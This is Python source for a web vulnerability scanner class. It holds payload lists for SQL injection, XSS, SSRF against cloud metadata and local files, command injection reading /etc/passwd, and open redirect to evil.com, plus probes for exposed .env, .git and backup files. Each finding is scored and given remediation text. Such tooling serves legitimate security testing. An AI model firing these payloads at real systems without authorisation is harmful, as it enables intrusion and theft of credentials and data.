"""Automated Vulnerability Scanner - SQLi, XSS, SSRF, Command Injection, etc."""

import asyncio
import re
import time
from typing import Dict, Any, List, Optional
from dataclasses import dataclass, field
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import httpx
from ..utils.logger import logger


@dataclass
class VulnFinding:
    """A vulnerability finding."""
    id: int
    vuln_type: str
    severity: str  # critical, high, medium, low, info
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    remediation: str = ""
    cvss: float = 0.0
    timestamp: str = ""


class VulnScanner:
    """Automated vulnerability scanner with multiple attack modules."""

    SQLI_PAYLOADS = [
        "'", "1' OR '1'='1", "1' OR 1=1--", "1' UNION SELECT NULL--",
        "1' AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
        "' OR ''='", "' OR 'x'='x", "admin'--", "') OR ('1'='1",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'-alert('XSS')-'",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "{{7*7}}", "${7*7}",  # Template injection
    ]

    SSRF_PAYLOADS = [
        "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",  # GCP metadata
        "http://169.254.169.254/metadata/azure",  # Azure
        "file:///etc/passwd", "file:///c:/windows/win.ini",
    ]

    CMDI_PAYLOADS = [
        "; ls", "| ls", "$(ls)", "`ls`",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "; sleep 5", "| sleep 5",
    ]

    def __init__(self):
        self.findings: List[VulnFinding] = self._load_findings()
        self.finding_counter = len(self.findings)
        self.client = httpx.Client(follow_redirects=True, timeout=10, verify=False)

    def _load_findings(self) -> List[VulnFinding]:
        return []

    def _add_finding(self, vuln_type: str, severity: str, url: str,
                     parameter: str = "", payload: str = "", evidence: str = "",
                     description: str = "", remediation: str = "", cvss: float = 0.0) -> VulnFinding:
        self.finding_counter += 1
        finding = VulnFinding(
            id=self.finding_counter,
            vuln_type=vuln_type,
            severity=severity,
            url=url,
            parameter=parameter,
            payload=payload,
            evidence=evidence[:500],
            description=description,
            remediation=remediation,
            cvss=cvss,
            timestamp=datetime.now().isoformat()
        )
        self.findings.append(finding)
        logger.warning(f"[red][{severity.upper()}] {vuln_type} at {url}[/red]")
        return finding

    def scan_sql_injection(self, url: str, params: Optional[Dict] = None) -> List[VulnFinding]:
        """Test for SQL injection."""
        logger.info(f"[*] Testing SQL injection: {url}")
        findings = []

        for payload in self.SQLI_PAYLOADS:
            try:
                # Test GET params
                test_params = dict(params or {})
                for key in test_params:
                    original = test_params[key]
                    test_params[key] = payload

                start = time.time()
                response = self.client.get(url, params=test_params)
                elapsed = time.time() - start

                body = response.text.lower()
                # Detect SQL errors
                sql_errors = [
                    "sql syntax", "mysql", "sqlite", "postgresql", "ORA-",
                    "unclosed quotation", "incorrect syntax", "quoted string",
                    "unterminated", "mysql_fetch", "pg_query", "You have an error"
                ]

                for error in sql_errors:
                    if error.lower() in body:
                        finding = self._add_finding(
                            vuln_type="SQL Injection",
                            severity="CRITICAL",
                            url=url,
                            parameter=str(test_params),
                            payload=payload,
                            evidence=body[:300],
                            description=f"SQL error detected: {error}",
                            remediation="Use parameterized queries/prepared statements",
                            cvss=9.8
                        )
                        findings.append(finding)
                        break

                # Time-based detection
                if elapsed > 4.5 and "SLEEP" in payload.upper():
                    finding = self._add_finding(
                        vuln_type="SQL Injection (Time-based)",
                        severity="CRITICAL",
                        url=url,
                        parameter=str(test_params),
                        payload=payload,
                        evidence=f"Response time: {elapsed:.1f}s (expected ~5s for SLEEP)",
                        description="Time-based blind SQL injection",
                        remediation="Use parameterized queries",
                        cvss=9.8
                    )
                    findings.append(finding)

                # UNION detection
                if "UNION" in payload.upper() and ("null" in body or "column" in body):
                    finding = self._add_finding(
                        vuln_type="SQL Injection (UNION)",
                        severity="CRITICAL",
                        url=url,
                        parameter=str(test_params),
                        payload=payload,
                        evidence=body[:300],
                        description="UNION-based SQL injection possible",
                        remediation="Use parameterized queries",
                        cvss=9.8
                    )
                    findings.append(finding)

                test_params[key] = original

            except Exception as e:
                continue

        return findings

    def scan_xss(self, url: str, params: Optional[Dict] = None) -> List[VulnFinding]:
        """Test for XSS."""
        logger.info(f"[*] Testing XSS: {url}")
        findings = []

        for payload in self.XSS_PAYLOADS:
            try:
                test_params = dict(params or {})
                for key in test_params:
                    test_params[key] = payload

                response = self.client.get(url, params=test_params)
                body = response.text

                # Check if payload reflected
                if payload in body:
                    # Check if not properly encoded
                    if "<script>" in payload or "onerror" in payload or "onload" in payload:
                        finding = self._add_finding(
                            vuln_type="Cross-Site Scripting (XSS)",
                            severity="HIGH",
                            url=url,
                            parameter=str(test_params),
                            payload=payload,
                            evidence=f"Payload reflected in response",
                            description="Reflected XSS vulnerability",
                            remediation="Encode output, implement CSP",
                            cvss=7.5
                        )
                        findings.append(finding)

                # Template injection
                if "{{7*7}}" in payload and "49" in body:
                    finding = self._add_finding(
                        vuln_type="Server-Side Template Injection",
                        severity="CRITICAL",
                        url=url,
                        parameter=str(test_params),
                        payload=payload,
                        evidence="Template expression evaluated (7*7=49)",
                        description="SSTI vulnerability - can lead to RCE",
                        remediation="Sanitize template inputs, use sandboxing",
                        cvss=9.8
                    )
                    findings.append(finding)

            except Exception:
                continue

        return findings

    def scan_ssrf(self, url: str, params: Optional[Dict] = None) -> List[VulnFinding]:
        """Test for SSRF."""
        logger.info(f"[*] Testing SSRF: {url}")
        findings = []

        for payload in self.SSRF_PAYLOADS:
            try:
                test_params = dict(params or {})
                for key in test_params:
                    test_params[key] = payload

                response = self.client.get(url, params=test_params)
                body = response.text.lower()

                # Check for server response
                if response.status_code == 200:
                    if "127.0.0.1" in payload or "localhost" in payload:
                        if "root:" in body or "aws" in body or "[program" in body:
                            finding = self._add_finding(
                                vuln_type="Server-Side Request Forgery (SSRF)",
                                severity="CRITICAL",
                                url=url,
                                parameter=str(test_params),
                                payload=payload,
                                evidence=body[:300],
                                description="Internal network access via SSRF",
                                remediation="Whitelist allowed URLs, block internal IPs",
                                cvss=9.0
                            )
                            findings.append(finding)

                    if "169.254.169.254" in payload:
                        if "ami-" in body or "instance" in body or "meta-data" in body:
                            finding = self._add_finding(
                                vuln_type="SSRF - Cloud Metadata Access",
                                severity="CRITICAL",
                                url=url,
                                parameter=str(test_params),
                                payload=payload,
                                evidence=body[:300],
                                description="AWS/GCP/Azure metadata accessible",
                                remediation="Block cloud metadata endpoints",
                                cvss=10.0
                            )
                            findings.append(finding)

            except Exception:
                continue

        return findings

    def scan_cmd_injection(self, url: str, params: Optional[Dict] = None) -> List[VulnFinding]:
        """Test for command injection."""
        logger.info(f"[*] Testing Command Injection: {url}")
        findings = []

        for payload in self.CMDI_PAYLOADS:
            try:
                test_params = dict(params or {})
                for key in test_params:
                    test_params[key] = payload

                start = time.time()
                response = self.client.get(url, params=test_params)
                elapsed = time.time() - start

                body = response.text.lower()

                # Check for command output
                if "root:" in body or "bin/" in body or "total " in body:
                    finding = self._add_finding(
                        vuln_type="OS Command Injection",
                        severity="CRITICAL",
                        url=url,
                        parameter=str(test_params),
                        payload=payload,
                        evidence=body[:300],
                        description="Remote command execution possible",
                        remediation="Never pass user input to system commands",
                        cvss=10.0
                    )
                    findings.append(finding)

                # Time-based
                if "sleep" in payload and elapsed > 4.5:
                    finding = self._add_finding(
                        vuln_type="OS Command Injection (Time-based)",
                        severity="CRITICAL",
                        url=url,
                        parameter=str(test_params),
                        payload=payload,
                        evidence=f"Response time: {elapsed:.1f}s",
                        description="Time-based blind command injection",
                        remediation="Never pass user input to system commands",
                        cvss=10.0
                    )
                    findings.append(finding)

            except Exception:
                continue

        return findings

    def scan_open_redirect(self, url: str, params: Optional[Dict] = None) -> List[VulnFinding]:
        """Test for open redirect."""
        logger.info(f"[*] Testing Open Redirect: {url}")
        findings = []
        redirect_payloads = [
            "https://evil.com", "//evil.com", "/\\evil.com",
            "https://evil.com%00.example.com",
        ]

        for payload in redirect_payloads:
            try:
                test_params = dict(params or {})
                for key in test_params:
                    test_params[key] = payload

                response = self.client.get(url, params=test_params, follow_redirects=False)
                location = response.headers.get("location", "")

                if payload in location or "evil.com" in location:
                    finding = self._add_finding(
                        vuln_type="Open Redirect",
                        severity="MEDIUM",
                        url=url,
                        parameter=str(test_params),
                        payload=payload,
                        evidence=f"Redirected to: {location}",
                        description="Unvalidated redirect to external URL",
                        remediation="Validate redirect URLs against whitelist",
                        cvss=6.1
                    )
                    findings.append(finding)

            except Exception:
                continue

        return findings

    def scan_info_disclosure(self, url: str) -> List[VulnFinding]:
        """Check for information disclosure."""
        logger.info(f"[*] Testing Info Disclosure: {url}")
        findings = []

        sensitive_paths = [
            ("/.env", "Environment variables exposed"),
            ("/.git/config", "Git repository exposed"),
            ("/robots.txt", "Sensitive paths in robots.txt"),
            ("/.htaccess", "Htaccess file exposed"),
            ("/server-status", "Server status page exposed"),
            ("/wp-config.php.bak", "WordPress config backup"),
            ("/phpinfo.php", "PHP info exposed"),
            ("/.DS_Store", "DS_Store file exposed"),
            ("/backup.sql", "Database backup exposed"),
            ("/swagger.json", "API documentation exposed"),
            ("/api-docs", "API documentation exposed"),
            ("/graphql", "GraphQL endpoint exposed"),
        ]

        for path, desc in sensitive_paths:
            try:
                response = self.client.get(f"{url.rstrip('/')}{path}")
                if response.status_code == 200 and len(response.text) > 50:
                    severity = "HIGH" if path in ("/.env", "/.git/config", "/backup.sql") else "MEDIUM"
                    self._add_finding(
                        vuln_type="Information Disclosure",
                        severity=severity,
                        url=f"{url.rstrip('/')}{path}",
                        evidence=response.text[:200],
                        description=desc,
                        remediation=f"Remove or restrict access to {path}",
                        cvss=5.3 if severity == "MEDIUM" else 7.5
                    )
            except Exception:
                continue

        return findings

    def scan_full(self, url: str, params: Optional[Dict] = None) -> List[VulnFinding]:
        """Run all scans on a URL."""
        logger.info(f"[bold blue]Full vulnerability scan: {url}[/bold blue]")

        all_findings = []
        all_findings.extend(self.scan_sql_injection(url, params))
        all_findings.extend(self.scan_xss(url, params))
        all_findings.extend(self.scan_ssrf(url, params))
        all_findings.extend(self.scan_cmd_injection(url, params))
        all_findings.extend(self.scan_open_redirect(url, params))
        all_findings.extend(self.scan_info_disclosure(url))

        logger.info(f"[green]Scan complete: {len(all_findings)} findings[/green]")
        return all_findings

    def get_report(self) -> Dict:
        """Generate scan report."""
        return {
            "total_findings": len(self.findings),
            "critical": len([f for f in self.findings if f.severity == "CRITICAL"]),
            "high": len([f for f in self.findings if f.severity == "HIGH"]),
            "medium": len([f for f in self.findings if f.severity == "MEDIUM"]),
            "low": len([f for f in self.findings if f.severity == "LOW"]),
            "findings": [
                {
                    "type": f.vuln_type,
                    "severity": f.severity,
                    "url": f.url,
                    "parameter": f.parameter,
                    "payload": f.payload,
                    "evidence": f.evidence[:200],
                    "description": f.description,
                    "remediation": f.remediation,
                    "cvss": f.cvss,
                }
                for f in self.findings
            ]
        }
